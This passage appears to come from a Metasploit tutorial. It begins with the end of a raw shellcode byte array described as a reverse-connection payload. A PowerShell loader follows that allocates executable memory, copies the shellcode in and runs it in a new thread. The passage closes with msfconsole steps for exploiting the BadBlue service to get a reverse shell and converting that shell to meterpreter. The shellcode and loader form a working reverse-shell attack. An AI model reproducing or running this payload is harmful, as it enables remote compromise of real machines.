xba,0xea,0xf,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0xa,0x49,0xff,0xce,0x75,0xe5,0xe8,0x93,0x0,0x0,0x0,0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9,0x6a,0x4,0x41,0x58,0x48,0x89,0xf9,0x41,0xba,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41,0x59,0x68,0x0,0x10,0x0,0x0,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,0xc9,0x41,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,0x49,0x89,0xc7,0x4d,0x31,0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x0,0x40,0x0,0x0,0x41,0x58,0x6a,0x0,0x5a,0x41,0xba,0xb,0x2f,0xf,0x30,0xff,0xd5,0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x49,0xff,0xce,0xe9,0x3c,0xff,0xff,0xff,0x48,0x1,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41,0xff,0xe7,0x58,0x6a,0x0,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5
</payloads which give the reverse connection>


$MyvOSKBhLVROC = $dMINRLHJd::VirtualAlloc(0,[Math]::Max($JuKDqxuZa.Length,0x1000),0x3000,0x40)

[System.Runtime.InteropServices.Marshal]::Copy($JuKDqxuZa,0,$MyvOSKBhLVROC,$JuKDqxuZa.Length)

$dMINRLHJd::CreateThread(0,0,$MyvOSKBhLVROC,0,0,0)

```



Example:

> Badblue is a vulnerable Service which provide with Reverse Shell Connections.

```
#search badblue 7
#use that exploit
Fill the required details using #options
#set rhosts & set lports or Lports leave defaults.
#run / Exploit

```

### POST MODULE EXPLOITS

> After getting the meterpreter console just like pre module auxilliary there is POST module which help  with POST Exploits to know after sessions methods.
>
> Example gets the shells sessions now convert into meterpreter there is a POST Modules called multi/manag/shell\_to\_meterpreter
>
> Set sessions
>
> run
